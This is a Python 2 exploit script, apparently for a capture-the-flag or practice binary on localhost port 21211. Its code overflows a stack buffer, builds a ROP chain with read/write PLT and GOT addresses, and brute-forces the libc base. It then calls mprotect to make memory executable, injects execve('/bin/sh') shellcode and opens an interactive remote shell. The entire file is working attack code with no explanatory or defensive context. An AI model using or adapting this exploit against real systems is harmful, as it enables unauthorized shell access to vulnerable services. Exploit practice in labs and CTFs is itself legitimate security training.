import socket
import sys
import time
import struct
import telnetlib


HOST="localhost"
PORT=21211

popebp_addr   = 0x80483c3
leave_addr    = 0x804841b
data_addr     = 0x8049620
plt_read	  = 0x804832c
got_read      = 0x804961c
pop3ret_addr  = 0x80484b6

mprotect_offset = 0xe70d0
write_offset    = 0xdac50

libc_bace=0xf7000000
print "[*] Trying brute force..."

while True:
	try:
		sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		sock.connect((HOST,PORT))
		sock.settimeout(1)

		buf="A"*136
		buf+=struct.pack("<I",data_addr+0x100-0x4)
		buf+=struct.pack("<I",plt_read)
		buf+=struct.pack("<I",leave_addr)
		buf+=struct.pack("<I",0)
		buf+=struct.pack("<I",data_addr+0x100)
		buf+=struct.pack("<I",512)

		sock.send(buf)

		libc_write=libc_bace+write_offset

		buf=""
		#write got_read
		buf+=struct.pack("<I",libc_write)
		buf+=struct.pack("<I",pop3ret_addr)
		buf+=struct.pack("<I",1)
		buf+=struct.pack("<I",got_read)
		buf+=struct.pack("<I",4)
		#read shellcode
		buf+=struct.pack("<I",plt_read)
		buf+=struct.pack("<I",pop3ret_addr)
		buf+=struct.pack("<I",0)
		buf+=struct.pack("<I",data_addr+0x200)
		buf+=struct.pack("<I",25)
		#read mprotect_addr
		buf+=struct.pack("<I",plt_read)
		buf+=struct.pack("<I",pop3ret_addr)
		buf+=struct.pack("<I",0)
		buf+=struct.pack("<I",0x8049618)
		buf+=struct.pack("<I",4)
		#mprotect
		buf+=struct.pack("<I",0x804831c)
		buf+=struct.pack("<I",data_addr+0x200)
		buf+=struct.pack("<I",0x08049000)
		buf+=struct.pack("<I",0x2000)
		buf+=struct.pack("<I",0x7)
		sock.send(buf)

		if (len(sock.recv(4))!=4):
			raise socket.timeout

		print "\n[+] Got a libc_bace:0x%x"%libc_bace

		shellcode="\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80\n"
		sock.send(shellcode)
		print "[+] Send shellcode"

		mprotect_addr  = libc_bace + mprotect_offset
		sock.send(struct.pack("<I",mprotect_addr))
		print "[+] Overwriting got_read->0x%x"%mprotect_addr
		print "[+] Stage2 complete"

		break
	
	except socket.timeout:
		libc_bace+=0x1000
		sys.stdout.write("\r[+] 0x%x"%libc_bace)
		sys.stdout.flush()
		continue



print "[*] Shell started"
t=telnetlib.Telnet()
t.sock=sock
t.interact()
sock.close()